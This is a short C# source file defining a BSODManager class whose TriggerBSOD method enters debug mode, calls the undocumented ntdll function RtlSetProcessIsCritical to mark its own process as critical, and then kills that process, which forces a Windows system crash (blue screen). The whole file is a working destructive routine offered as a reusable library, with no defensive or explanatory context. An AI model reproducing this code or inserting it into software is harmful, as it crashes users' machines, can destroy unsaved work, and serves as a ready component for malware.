using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace BSOD.NET
{
    public class BSODManager
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        public static void TriggerBSOD()
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
            Process.GetCurrentProcess().Kill();
        }
    }
}